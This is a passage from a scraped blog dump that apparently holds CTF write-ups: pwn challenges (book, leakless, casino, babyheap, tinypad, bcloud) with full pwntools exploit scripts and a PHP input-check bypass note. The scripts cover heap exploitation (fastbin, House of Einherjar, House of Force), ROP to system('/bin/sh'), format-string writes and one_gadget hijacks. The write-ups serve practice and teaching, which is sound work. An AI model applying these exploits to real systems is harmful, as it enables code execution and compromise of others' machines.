*p=process(&quot;./book&quot;)#p=remote(&quot;159.65.68.241&quot;,&quot;10004&quot;)libc = ELF(&quot;./libc-2.23.so&quot;,checksec=False)malloc_hook = libc.symbols[&quot;__malloc_hook&quot;]def add(name,size,content): p.sendlineafter(&quot;choice:&quot;, &quot;1&quot;) p.sendlineafter(&quot;name?&quot;,name) p.sendlineafter(&quot;name?&quot;,str(size)) p.sendlineafter(&quot;book&quot;,content)def delete(index): p.sendlineafter(&quot;choice:&quot;,&quot;2&quot;) p.sendlineafter(&quot;sell?&quot;,str(index))def read(index): p.sendlineafter(&quot;choice:&quot;,&quot;3&quot;) p.sendlineafter(&quot;sell?&quot;,str(index))code = ELF(&quot;./book&quot;,checksec=False)puts_got = code.got[&quot;puts&quot;]add(&quot;1&quot;,0,&quot;a&quot;) #0add(&quot;2&quot;,0x40,&quot;b&quot;) #1add(&quot;fence&quot;,0,p64(0xdeadbeef)) #2delete(1)delete(0)add(p64(0x51)*2,0,&quot;a&quot;*0x18+p64(0x51)+p64(0x602060)) #0add(&quot;b&quot;,0x40,&quot;b&quot;) #1add(&quot;c&quot;,0x40,&quot;c&quot;*0x10+p64(puts_got)) #3read(0)p.recvuntil(&quot;name:&quot;)puts_addr = p.recv(6)+&quot;\\x00&quot;*2puts_addr = u64(puts_addr)libc_base = puts_addr - libc.symbols[&quot;puts&quot;]print(hex(libc_base))print(&quot;-------------------&quot;)add(&quot;d&quot;,0,&quot;d&quot;) #4add(&quot;e&quot;,0x50,&quot;e&quot;) #5add(&quot;fence&quot;,0,p64(0xdeadbeef)) #6#gdb.attach(p)delete(5) delete(4)#gdb.attach(p)add(&quot;d&quot;,0,&quot;d&quot;*0x18+p64(0x61)+p64(0x51)+&quot;123&quot;) #4add(&quot;e&quot;,0x50,&quot;e&quot;) #5#gdb.attach(p)add(&quot;g&quot;,0,&quot;d&quot;) #6add(&quot;h&quot;,0x40,&quot;e&quot;) #7#gdb.attach(p)add(&quot;fence&quot;,0,p64(0xdeadbeef)) #8#gdb.attach(p)delete(8)delete(7)add(&quot;g&quot;,0,&quot;g&quot;*0x18+p64(0x51)+p64(libc_base+0x3c4b40)+&quot;123&quot;) #8#gdb.attach(p)add(&quot;h&quot;,0x40,&quot;g&quot;) #7print hex(libc_base+0x3c4b40)#gdb.attach(p)add(&quot;i&quot;,0x40,p64(0)*5+p64(libc_base+0x3c4b00)) #9#gdb.attach(p)add(&quot;exp&quot;,0,p64(libc_base+0x4526a)) #10print hex(libc_base+0x4526a)#gdb.attach(p)p.sendlineafter(&quot;choice:&quot;, &quot;1&quot;)p.sendlineafter(&quot;name?&quot;,&quot;aaa&quot;)p.sendlineafter(&quot;name?&quot;,&quot;0&quot;)p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Fun with PHP Code Audit","slug":"fun-with-php-code-audit","date":"2019-01-31T07:47:31.000Z","updated":"2019-01-31T08:07:35.604Z","comments":true,"path":"2019/01/31/fun-with-php-code-audit/","link":"","permalink":"http://siriuswhiter.tk/2019/01/31/fun-with-php-code-audit/","excerpt":"","text":"pwn的头疼＋心累，玩一玩入门的PHP代码审计 基础传参从最基本的来说，常用的网页传参即 GET 与 POST对于用户来讲，GET传参就是往网页链接后面直接添加参数，比如说https://test.php?a=1;而POST传参一般需要写个脚本或者使用插件，比如说火狐浏览器的hackbar插件。 简单的PHP函数检测绕过 is_numeric: 检测是否为数字，但是如果输入 数字＋字母 （1ab）便能过检测，但是 php中 1ab ==1 为true extract： 从数组中将变量导入到当前的符号表。使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 但一般若设置为空，则有希望通过判断 对于数字之间的比较，通常可以使用数组来绕过，比如说 strcmp，strpos，MD5 ，sha1 等对两个用户输入字符串比较的，都可以使用数组尝试","categories":[{"name":"web","slug":"web","permalink":"http://siriuswhiter.tk/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://siriuswhiter.tk/tags/web/"}]},{"title":"fireshell-2019-pwn","slug":"fireshell-2019-pwn","date":"2019-01-29T09:09:33.000Z","updated":"2019-02-08T06:52:36.780Z","comments":true,"path":"2019/01/29/fireshell-2019-pwn/","link":"","permalink":"http://siriuswhiter.tk/2019/01/29/fireshell-2019-pwn/","excerpt":"","text":"本来在之前没搞完的jarvisOJ那边遇到了问题，想问学长来着，结果被拉过来看看这个比赛，被自己菜哭 leakless题目12char buf; // [esp+0h] [ebp-48h]return read(0, &amp;buf, 0x100u); 分析一个简单的栈溢出，第一反应是去泄露libc版本，后面又突然想着把shellcode写到bss段，但是奈何总是不成功，vmmap才发现bss段不可执行，且不存在能够wx的段，因为以前用LibcSearcher没成功（ps:完全不记得为什么），偏偏用DynElf爆破失败，所以还是转向LibcSearcher. exp123456789101112131415161718192021222324from pwn import *from LibcSearcher import *context.log_level = &apos;debug&apos;sh = process(&apos;./leakless&apos;)libc = ELF(&apos;./leakless&apos;)pay = &apos;a&apos;*0x48 + &apos;bbbb&apos; + p32(libc.symbols[&apos;puts&apos;])+p32(libc.symbols[&apos;feedme&apos;]) +p32(libc.got[&apos;puts&apos;])sh.sendline(pay)puts_got_addr = u32(sh.recv(4))print &quot;puts_got_addr: &quot;+hex(puts_got_addr)obj = LibcSearcher(&quot;puts&quot;,puts_got_addr)system_addr = puts_got_addr - obj.dump(&apos;puts&apos;)+obj.dump(&quot;system&quot;)binsh_addr = puts_got_addr - obj.dump(&apos;puts&apos;) + obj.dump(&quot;str_bin_sh&quot;) success( &quot;system_addr: &quot;+hex(system_addr))success(&quot;binsh_addr: &quot;+hex(binsh_addr))pay = &apos;a&apos;*0x48 + &apos;bbbb&apos; + p32(system_addr) + p32(libc.symbols[&apos;main&apos;]) + p32(binsh_addr)#gdb.attach(sh)sh.sendline(pay)sh.interactive() casino题目用户输入的值与随机数匹配成功100次，之后会读取flag.txt文件并输出。 1234seed = (unsigned int)time(0LL) / 10;seed += bet;(bet=1)srand(seed);rand(); 分析格式化字符串漏洞，但是大小限制在了0x10，能够泄露出来seed，也就能预测第一次的值，然后因为要泄露100次，想着顺便把栈上的记录次数的值或者bet一起改掉，但是因为长度限制，最后有点懵。感觉二者不可得兼。 看大佬们的wp，因为seed是用time(0)/10+ bet ,可以先自己先利用time将seed计算出来，然后计算rand();因为python和c的rand()不同，所以得考虑如何将在python脚本中计算c的随机数，可以有： 单独写一份c的程序计算随机数，脚本中调用c程序(昨天也是这么做的)； 使用python和c的混合编程包：ctypes。 经实践，同一个seed得到的随机数序列都是一样的…，而题中通过time(0)/10对seed给了容错 exp 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from time import *context.log_level=&apos;debug&apos;now=int(time())/10+2sh=process(&quot;./timerand&quot;)####include&lt;stdio.h&gt;int main()&#123; int i; int seed; scanf(&quot;%d&quot;,&amp;seed); srand(seed); for(i = 0; i &lt; 100; i++) &#123; printf(&quot;%d &quot;,rand()); &#125; printf(&quot;\\n&quot;);&#125;###sh.sendline(str(now))rand=sh.recvuntil(&quot;\\n&quot;).strip().split(&quot; &quot;)print randsh.close()#sleep(0.5)#sh=remote(&quot;challs.fireshellsecurity.team&quot;,31006)sh=process(&apos;./casino&apos;)sh.sendafter(&quot;What is your name? &quot;,&quot;aa%11$hn&quot;+p64(0x602020))#gdb.attach(sh)for i in range(99): sh.sendlineafter(&quot;number: &quot;,rand[i])print sh.recv()sh.interactive() 123456789101112131415161718192021from pwn import *from ctypes import cdllsh = process(&quot;./casino&quot;)sh.recvuntil(&apos;What is your name? &apos;)sh.send(&quot;%8$p&quot;)sh.recvuntil(&apos;Welcome &apos;)seed =eval(sh.recvuntil(&apos;\\n&apos;,drop=True))&amp;0xffffffff &lt;--- 数据类型转换成int型print seedsh.close()seed += 3 &lt;----还是不清楚这个3怎么计算出来的，或许是因为两个程序打开具有延迟？？libc = cdll.LoadLibrary(&quot;&quot;) &lt;--- 突然发现这里为空也不影响？？libc.srand(seed)sh = process(&apos;./casino&apos;)pay = &apos;aaa%11$n&apos;+p64(0x602020)sh.recvuntil(&apos;What is your name? &apos;)sh.send(pay)for i in range(99): sh.sendlineafter(&quot;Guess my number: &quot;,str(libc.rand()))sh.interactive() babyheap题目1234567891011121314151617181920212223242526272829303132333435363738394041424344454647int create()&#123; int result; // eax buf = malloc(0x60uLL); result = puts(&quot;Done!&quot;); create_inuse = 1LL; return result;&#125;ssize_t edit()&#123; ssize_t result; // rax printf(&quot;Content? &quot;); result = read(0, buf, 0x40uLL); edit_inuse = 1LL; return result;&#125;int show()&#123; int result; // eax result = printf(&quot;Content: %s\\n&quot;, buf); show_inuse = 1LL; return result;&#125;int delete()&#123; int result; // eax free(buf); // UAF result = puts(&quot;Done!&quot;); create_inuse = 0LL; delete_inuse = 1LL; return result;&#125;__int64 fill()&#123; buf = malloc(0x60uLL); printf(&quot;Fill &quot;); read(0, buf, 0x40uLL); return fill_inuse++ + 1;&#125; 分析各项功能除了次数检查基本没有限制，所以在有限的步骤内将chunk分配到 123456.bss:00000000006020A0 create_inuse .bss:00000000006020A8 edit_inuse .bss:00000000006020B0 show_inuse .bss:00000000006020B8 delete_inuse .bss:00000000006020C0 fill_inuse .bss:00000000006020C8 ; void *buf 我们可以使用UAF漏洞＋fastbinattack达到目的，这样不仅消除了次数限制问题，同时可以随意修改指针所以之后便是先泄露libc基址，之后修改atoi.got表为system,输入’/bin/sh’即可 exp1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *context.log_level=&apos;debug&apos;def new(): sh.sendlineafter(&quot;&gt; &quot;,&quot;1&quot;)def edit(note): sh.sendlineafter(&quot;&gt; &quot;,&quot;2&quot;) sh.sendafter(&quot;Content? &quot;,note)def delete(): sh.sendlineafter(&quot;&gt; &quot;,&quot;4&quot;)def show(): sh.sendlineafter(&quot;&gt; &quot;,&quot;3&quot;) sh.recvuntil(&quot;Content: &quot;) return sh.recvuntil(&quot;\\n&quot;)def fill(note): sh.sendlineafter(&quot;&gt; &quot;,&quot;1337&quot;) sh.sendafter(&quot;Fill &quot;,note)sh=process(&quot;./babyheap&quot;)elf = ELF(&quot;./babyheap&quot;)libc = ELF(&quot;./libc.so.6&quot;)new()delete()edit(p64(0x602095-8))new()fill(&apos;/bin/sh&apos;+chr(0)+&apos;a&apos;*0x33+p64(0x602060)[0:3])#gdb.attach(p)sh.sendline(&apos;3&apos;)sh.recvuntil(&apos;Content: &apos;)libc_addr = u64(sh.recvuntil(&apos;\\n&apos;)[:-1].ljust(8,&apos;\\x00&apos;))-libc.plt[&apos;atoi&apos;]print &quot;libc_addr : &quot; + hex(libc_addr)#gdb.attach(p)system_addr = libc_addr + libc.plt[&apos;system&apos;]edit(p64(system_addr))sh.sendline(&apos;/bin/sh&apos;)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Introduction to pwn2.8-HouseOfEinherjar","slug":"introduction-to-pwn2-8-houseofeinherjar","date":"2019-01-24T09:32:53.000Z","updated":"2019-01-25T06:55:36.870Z","comments":true,"path":"2019/01/24/introduction-to-pwn2-8-houseofeinherjar/","link":"","permalink":"http://siriuswhiter.tk/2019/01/24/introduction-to-pwn2-8-houseofeinherjar/","excerpt":"","text":"House of Einherjar 原理感觉像是把好几种漏洞结合起来： off by one unlink （需要能够完全溢出到下一个堆来控制 chunk entend or shrink; 但是细节却不相同。 该利用需要： chunk能够覆盖next_chunk的pre_size并修改pre_inuse位 泄露地址使得unlink 检查pre_size与size时能够绕过 fake_chunk的fd 与 bk指针需要能够绕过检查 当我们能够覆盖nextchunk的pre_size位及pre_inuse位时，我们便可以伪造fake_chunk，之后在free next_chunk时，fake_chunk通过伪造便能绕过检查被置入bin中 Tinypad题目程序自己重写了许多write read函数主要功能 add edit delete 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108 do &#123; for ( i = 0; i &lt;= 3; ++i ) &#123; LOBYTE(c) = i + &apos;1&apos;; if ( *(_QWORD *)&amp;tinypad[16 * (i + 16LL) + 8] ) &#123; v3 = strlen(*(const char **)&amp;tinypad[16 * (i + 16LL) + 8]); writeln(*(char **)&amp;tinypad[16 * (i + 16LL) + 8], v3); &#125; writeln(&quot;\\n&quot;, 1LL); &#125; write_n( &quot;+- MENU -----------------------------------------------------------------------+\\n&quot; &quot;| [A] Add memo |\\n&quot; &quot;| [D] Delete memo |\\n&quot; &quot;| [E] Edit memo |\\n&quot; &quot;| [Q] Quit |\\n&quot; &quot;+------------------------------------------------------------------------------+\\n&quot;, 486LL); if ( cmd == &apos;D&apos; ) // delete &#123; write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL); idx = read_int(); if ( idx &gt; 0 &amp;&amp; idx &lt;= 4 ) &#123; if ( *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] )// inuse &#123; free(*(void **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]);// ptr *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] = 0LL; writeln(&quot;\\nDeleted.&quot;, 9LL); &#125; &#125; if ( cmd = &apos;E&apos; ) write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL); idx = read_int(); if ( idx &gt; 0 &amp;&amp; idx &lt;= 4 ) &#123; if ( *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] ) &#123; c = &apos;0&apos;; strcpy(tinypad, *(const char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]); while ( toupper(c) != &apos;Y&apos; ) &#123; write_n(&quot;CONTENT: &quot;, 9LL); v6 = strlen(tinypad); writeln(tinypad, v6); write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL); v7 = strlen(*(const char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]); read_until(tinypad, v7, &apos;\\n&apos;); writeln(&quot;Is it OK?&quot;, 9LL); write_n(&quot;(Y/n)&gt;&gt;&gt; &quot;, 9LL); read_until((char *)&amp;c, 1uLL, &apos;\\n&apos;); &#125; strcpy(*(char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8], tinypad); writeln(&quot;\\nEdited.&quot;, 8LL); &#125; &#123; if ( cmd != &apos;A&apos; ) goto LABEL_43; while ( idx &lt;= 3 &amp;&amp; *(_QWORD *)&amp;tinypad[16 * (idx + 16LL)] ) ++idx; if ( idx == 4 ) &#123; writeln(&quot;No space is left.&quot;, 17LL); &#125; else &#123; size = -1; write_n(&quot;(SIZE)&gt;&gt;&gt; &quot;, 10LL); size = read_int(); if ( size &lt;= 0 ) &#123; v5 = 1; &#125; else &#123; v5 = size; if ( (unsigned __int64)size &gt; 0x100 ) v5 = 256; &#125; size = v5; // max size =256 *(_QWORD *)&amp;tinypad[16 * (idx + 16LL)] = v5; *(_QWORD *)&amp;tinypad[16 * (idx + 16LL) + 8] = malloc(size); if ( !*(_QWORD *)&amp;tinypad[16 * (idx + 16LL) + 8] )// 检查inuse位 &#123; writerrln(&quot;[!] No memory is available.&quot;, 27LL); exit(-1); &#125; write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL); read_until(*(char **)&amp;tinypad[16 * (idx + 16LL) + 8], size, 0xAu); writeln(&quot;\\nAdded.&quot;, 7LL); &#125; &#125; &#125; while ( cnt != 81 ); return 0;&#125; 思路因为读取输出函数都是重写的，比较麻烦，但是手动测试能够发现最低位的覆盖问题 再有在delete时仅将size清零并free chunk，没有将chunk 指针清零，UAF漏洞存在 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798from pwn import * p = process(&quot;./tinypad&quot;)libc = ELF(&quot;./libc.so.6&quot;)#context.log_level = &apos;debug&apos; def add(size, content): p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;) p.sendline(&quot;A&quot;) p.recvuntil(&quot;(SIZE)&gt;&gt;&gt; &quot;) p.sendline(str(size)) p.recvuntil(&quot;(CONTENT)&gt;&gt;&gt; &quot;) p.sendline(content) def delete(index): p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;) p.sendline(&quot;D&quot;) p.recvuntil(&quot;(INDEX)&gt;&gt;&gt; &quot;) p.sendline(str(index)) def edit(index, content, ok=True): p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;) p.sendline(&quot;E&quot;) p.recvuntil(&quot;(INDEX)&gt;&gt;&gt; &quot;) p.sendline(str(index)) p.recvuntil(&quot;(CONTENT)&gt;&gt;&gt; &quot;) p.sendline(content) p.recvuntil(&quot;(Y/n)&gt;&gt;&gt; &quot;) if ok: p.sendline(&quot;Y&quot;) else: p.sendline(&quot;n&quot;) #stage oneadd(0x80, &quot;A&quot;*0x80)add(0x80, &quot;B&quot;*0x80)add(0x80, &quot;C&quot;*0x80)add(0x80, &quot;D&quot;*0x80)delete(3)delete(1) p.recvuntil(&quot; # INDEX: 1\\n&quot;)p.recvuntil(&quot; # CONTENT: &quot;)heap = u64(p.recvline().rstrip().ljust(8, &quot;\\x00&quot;)) - 0x120log.info(&quot;heap_base: %s&quot; % hex(heap))p.recvuntil(&quot; # INDEX: 3\\n&quot;)p.recvuntil(&quot; # CONTENT: &quot;)main_arena = u64(p.recv(6).ljust(8, &quot;\\x00&quot;)) - 0x58log.info(&quot;main_arena: %s&quot; % hex(main_arena)) delete(2)delete(4) #stage twoadd(0x18, &quot;A&quot;*0x18)add(0x100, &quot;B&quot;*0xf8 + p64(0x11))add(0x100, &quot;C&quot;*0xf8)add(0x100, &quot;D&quot;*0xf8) tinypad = 0x602040offset = heap + 0x20 - 0x602040 - 0x20fake_chunk = p64(0) + p64(0x101) + p64(0x602060) * 2 edit(3, &quot;D&quot;*0x20 + fake_chunk)zero_byte_number = 8 - len(p64(offset).strip(&quot;\\x00&quot;))for i in range(zero_byte_number+1): data = &quot;A&quot;*0x10 + p64(offset).strip(&quot;\\x00&quot;).rjust(8-i, &apos;f&apos;) edit(1, data) delete(2)edit(4, &quot;D&quot;*0x20 + p64(0) + p64(0x101) + p64(main_arena + 0x58)*2) #gdb.attach(p) #stage threelibc_base = main_arena + 0x58 - 0x3c4b78log.info(&quot;libc_base: %s&quot; % hex(libc_base))one_gadget = libc_base + 0x45216environ_pointer = libc_base + libc.symbols[&apos;__environ&apos;] add(0xf0, &quot;A&quot;*0xd0 + p64(0x18) + p64(environ_pointer) + &apos;a&apos;*8 + p64(0x602148)) p.recvuntil(&quot; # INDEX: 1\\n&quot;)p.recvuntil(&quot; # CONTENT: &quot;)main_ret = u64(p.recvline().rstrip().ljust(8, &quot;\\x00&quot;)) - 0x8*30log.info(&quot;main_ret_addr: %s&quot; % hex(main_ret))log.info(&quot;one_gadget_addr :%s &quot;% hex(one_gadget))edit(2, p64(main_ret))edit(1, p64(one_gadget))#gdb.attach(p)p.recv()p.sendline(&apos;Q&apos;)p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Introduction to pwn2.7-HouseOfForce","slug":"introduction-to-pwn2-7-houseofforce","date":"2019-01-22T11:42:55.000Z","updated":"2019-01-24T09:41:48.321Z","comments":true,"path":"2019/01/22/introduction-to-pwn2-7-houseofforce/","link":"","permalink":"http://siriuswhiter.tk/2019/01/22/introduction-to-pwn2-7-houseofforce/","excerpt":"","text":"House of Force 原理一个比较有意思的利用，也是第一次对top chunk 下手，原因在于堆管理中并没有多的检查top chunk的大小问题。 我们在有机会溢出改变top chunk size的情况下，可以将其改大（eg:-1，64位下即为0xffffffffffffffff，比较时会转化为无符号数），之后不论申请多大的chunk，经比较size之后，都不会去调用mmap去分配top chunk，但我们可以通过分配足够大小的chunk使之在main_arena中top chunk的指针变换位置，也就是说，我们可以将其分配之后的chunk到我们想要的地址（eg:got表），这样我们便可以通过控制我们可以控制的指针来任意地址写。 所以最起码需要： 能够溢出至topchunk的size位 能够自由控制malloc大小 使用how2heap的例子来解释： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;char bss_var[] = &quot;This is a string that we want to overwrite.&quot;;int main(int argc , char* argv[])&#123; fprintf(stderr, &quot;\\nWelcome to the House of Force\\n\\n&quot;); fprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\\n&quot;); fprintf(stderr, &quot;The top chunk is a special chunk. Is the last in memory &quot; &quot;and is the chunk that will be resized when malloc asks for more space from the os.\\n&quot;); fprintf(stderr, &quot;\\nIn the end, we will use this to overwrite a variable at %p.\\n&quot;, bss_var); fprintf(stderr, &quot;Its current value is: %s\\n&quot;, bss_var); fprintf(stderr, &quot;\\nLet&apos;s allocate the first chunk, taking space from the wilderness.\\n&quot;); intptr_t *p1 = malloc(256); fprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\\n&quot;, p1 - sizeof(long)*2); fprintf(stderr, &quot;\\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\\n&quot;); int real_size = malloc_usable_size(p1); fprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\\n&quot;, real_size + sizeof(long)*2); fprintf(stderr, &quot;\\nNow let&apos;s emulate a vulnerability that can overwrite the header of the Top Chunk\\n&quot;); //----- VULNERABILITY ---- intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long)); fprintf(stderr, &quot;\\nThe top chunk starts at %p\\n&quot;, ptr_top); fprintf(stderr, &quot;\\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\\n&quot;); fprintf(stderr, &quot;Old size of top chunk %#llx\\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1; fprintf(stderr, &quot;New size of top chunk %#llx\\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); //------------------------ fprintf(stderr, &quot;\\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\\n&quot; &quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\\n&quot; &quot;overflow) and will then be able to allocate a chunk right over the desired region.\\n&quot;); /* * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata): * new_top = old_top + nb * nb = new_top - old_top * req + 2sizeof(long) = new_top - old_top * req = new_top - old_top - 2sizeof(long) * req = dest - 2sizeof(long) - old_top - 2sizeof(long) * req = dest - old_top - 4*sizeof(long) */ unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top; fprintf(stderr, &quot;\\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\\n&quot; &quot;we will malloc %#lx bytes.\\n&quot;, bss_var, ptr_top, evil_size); void *new_ptr = malloc(evil_size); fprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\\n&quot;, new_ptr - sizeof(long)*2); void* ctr_chunk = malloc(100); fprintf(stderr, &quot;\\nNow, the next chunk we overwrite will point at our target buffer.\\n&quot;); fprintf(stderr, &quot;malloc(100) =&gt; %p!\\n&quot;, ctr_chunk); fprintf(stderr, &quot;Now, we can finally overwrite that value:\\n&quot;); fprintf(stderr, &quot;... old string: %s\\n&quot;, bss_var); fprintf(stderr, &quot;... doing strcpy overwrite with \\&quot;YEAH!!!\\&quot;...\\n&quot;); strcpy(ctr_chunk, &quot;YEAH!!!&quot;); fprintf(stderr, &quot;... new string: %s\\n&quot;, bss_var); // some further discussion:// fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\\n\\n&quot;);// fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;// &quot;and we \\nwant to set this result to the address of malloc_got_address-8\\n\\n&quot;);// fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\\n\\n&quot;);// fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\\n\\n&quot;);// fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;// &quot;\\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\\n\\n&quot;);// fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\\n&quot;,p2);// fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\\n&quot;,malloc_got_address);// fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\\n&quot;);&#125; 运行效果： 123456789101112131415161718192021222324252627282930313233343536Welcome to the House of ForceThe idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.In the end, we will use this to overwrite a variable at 0x602060.Its current value is: This is a string that we want to overwrite.Let&apos;s allocate the first chunk, taking space from the wilderness.The chunk of 256 bytes has been allocated at 0xd61f90.Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.Real size (aligned and all that jazz) of our allocated chunk is 280.Now let&apos;s emulate a vulnerability that can overwrite the header of the Top ChunkThe top chunk starts at 0xd62110Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.Old size of top chunk 0x20ef1New size of top chunk 0xffffffffffffffffThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.Next, we will allocate a chunk that will get us right up against the desired region (with an integeroverflow) and will then be able to allocate a chunk right over the desired region.The value we want to write to at 0x602060, and the top chunk is at 0xd62110, so accounting for the header size,we will malloc 0xffffffffff89ff30 bytes.As expected, the new pointer is at the same place as the old top chunk: 0xd62110Now, the next chunk we overwrite will point at our target buffer.malloc(100) =&gt; 0x602060!Now, we can finally overwrite that value:... old string: This is a string that we want to overwrite.... doing strcpy overwrite with &quot;YEAH!!!&quot;...... new string: YEAH!!! 原理可以参考：https://bbs.pediy.com/thread-222924.htm bcloud回家做的第一道，看了半天没看出来漏洞。。。name的输出函数被漏掉了。。 题目刚进去要输入name 12345678910111213141516unsigned int get_name()&#123; char s; // [esp+1Ch] [ebp-5Ch] char *name_; // [esp+5Ch] [ebp-1Ch] unsigned int v3; // [esp+6Ch] [ebp-Ch] v3 = __readgsdword(0x14u); memset(&amp;s, 0, 0x50u); puts(&quot;Input your name:&quot;); read_str((int)&amp;s, 0x40, &apos;\\n&apos;); name_ = (char *)malloc(0x40u); name_ptr = (int)name_; strcpy(name_, &amp;s); puts_(name_); return __readgsdword(0x14u) ^ v3;&#125; 之后要输入Org &amp; Host,漏洞的主力。。。 1234567891011121314151617181920212223unsigned int get_org_host()&#123; char org; // [esp+1Ch] [ebp-9Ch] char *o; // [esp+5Ch] [ebp-5Ch] int host; // [esp+60h] [ebp-58h] char *h; // [esp+A4h] [ebp-14h] unsigned int v5; // [esp+ACh] [ebp-Ch] v5 = __readgsdword(0x14u); memset(&amp;org, 0, 0x90u); puts(&quot;Org:&quot;); read_str((int)&amp;org, 0x40, &apos;\\n&apos;); puts(&quot;Host:&quot;); read_str((int)&amp;host, 0x40, &apos;\\n&apos;); h = (char *)malloc(0x40u); o = (char *)malloc(0x40u); org_ptr = (int)o; host_ptr = (int)h; strcpy(h, (const char *)&amp;host); strcpy(o, &amp;org); &lt;------strcpy这里出的问题 puts(&quot;OKay! Enjoy:)&quot;); return __readgsdword(0x14u) ^ v5;&#125; 进去之后就是一个创建编辑删除同步note的程序，show，syn，quit没什么用 new_note: 1234567891011121314151617181920212223int new_note()&#123; int result; // eax signed int i; // [esp+18h] [ebp-10h] int length; // [esp+1Ch] [ebp-Ch] for ( i = 0; i &lt;= 9 &amp;&amp; ptr[i]; ++i ) //最多十个 ; if ( i == 10 ) return puts(&quot;Lack of space. Upgrade your account with just $100 :)&quot;); puts(&quot;Input the length of the note content:&quot;); length = get_num(); ptr[i] = (int)malloc(length + 4); //大小用户定义 if ( !ptr[i] ) exit(-1); len_[i] = length; puts(&quot;Input the content:&quot;); read_str(ptr[i], length, &apos;\\n&apos;); printf(&quot;Create success, the id is %d\\n&quot;, i); result = i; syn_inuse[i] = 0; return result;&#125; edit 12345678910111213141516171819int edit()&#123; int v1; // ST1C_4 int i; // [esp+14h] [ebp-14h] int id_ptr; // [esp+18h] [ebp-10h] puts(&quot;Input the id:&quot;); i = get_num(); if ( i &lt; 0 || i &gt; 9 ) return puts(&quot;Invalid ID.&quot;); id_ptr = ptr[i]; if ( !id_ptr ) return puts(&quot;Note has been deleted.&quot;); v1 = len_[i]; syn_inuse[i] = 0; puts(&quot;Input the new content:&quot;); read_str(id_ptr, v1, &apos;\\n&apos;); return puts(&quot;Edit success.&quot;);&#125; delete 1234567891011121314151617int delete()&#123; int i; // [esp+18h] [ebp-10h] void *ptr_; // [esp+1Ch] [ebp-Ch] 